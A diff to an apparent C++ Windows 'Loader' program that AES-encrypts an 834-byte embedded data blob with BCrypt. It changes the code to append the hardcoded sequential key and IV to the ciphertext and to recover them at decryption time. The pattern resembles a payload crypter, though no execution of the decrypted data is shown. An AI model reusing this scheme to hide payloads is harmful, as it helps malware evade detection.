@@ -83,17 +83,6 @@ static const BYTE rgbRawData[834] = {
 	0x35, 0x00, 0x12, 0x34, 0x56, 0x78
 };
 
-static const BYTE rgbIV[] =
-{
-    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
-    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
-};
-
-static const BYTE rgbAES128Key[] =
-{
-    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
-    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
-};
 
 #define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
 #define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
@@ -111,6 +100,11 @@ void Run(PBYTE pbCipherText, DWORD cbCipherText)
     PBYTE                   pbRawData = NULL,
 					        pbKeyObject = NULL,
 					        pbIV = NULL;
+    BYTE                    rgbIV[16] = {};
+    BYTE                    rgbAES128Key[16] = {};
+
+    memcpy(rgbAES128Key, &pbCipherText[cbCipherText - 32], 16);
+    memcpy(rgbIV, &pbCipherText[cbCipherText - 16], 16);
 
     // Open an algorithm handle.
     if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(
@@ -138,7 +132,6 @@ void Run(PBYTE pbCipherText, DWORD cbCipherText)
     pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
 	if (NULL == pbKeyObject)
     {
-        wprintf(L"**** memory allocation failed\n");
         goto Cleanup;
     }
 
@@ -199,7 +192,7 @@ void Run(PBYTE pbCipherText, DWORD cbCipherText)
 	if (!NT_SUCCESS(status = BCryptDecrypt(
 	    hKey,
 	    pbCipherText,
-	    cbCipherText,
+	    cbCipherText - 32,
 	    NULL,
 	    pbIV,
 	    cbBlockLen,
@@ -222,7 +215,7 @@ void Run(PBYTE pbCipherText, DWORD cbCipherText)
 	if (!NT_SUCCESS(status = BCryptDecrypt(
 	    hKey,
 	    pbCipherText,
-	    cbCipherText,
+	    cbCipherText - 32,
 	    NULL,
 	    pbIV,
 	    cbBlockLen,
@@ -272,6 +265,18 @@ Cleanup:
 }
 
 /* =================================================== Loader ================================================ */
+static const BYTE rgbIV[] =
+{
+    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
+};
+
+static const BYTE rgbAES128Key[] =
+{
+    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
+};
+
 void main()
 {
 	BCRYPT_ALG_HANDLE       hAesAlg = NULL;
@@ -286,6 +291,7 @@ void main()
 							pbRawData = NULL,
 							pbKeyObject = NULL,
 							pbIV = NULL;
+    BYTE                    creds[32] = {};
 
     // Open an algorithm handle.
     if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(
@@ -406,7 +412,7 @@ void main()
         goto Cleanup;
     }
 
-    pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);
+    pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText + 32);
     if (NULL == pbCipherText)
     {
         wprintf(L"**** memory allocation failed\n");
@@ -430,8 +436,13 @@ void main()
         wprintf(L"**** Error 0x%x returned by BCryptEncrypt\n", status);
         goto Cleanup;
     }
+
+    std::copy_n(rgbAES128Key, 16, creds);
+    std::copy_n(rgbIV, 16, creds + 16);
+
+    memcpy(&pbCipherText[cbCipherText], creds, sizeof(creds));
 	
-	Run(pbCipherText, cbCipherText);
+	Run(pbCipherText, cbCipherText + 32);
 
 Cleanup:
 
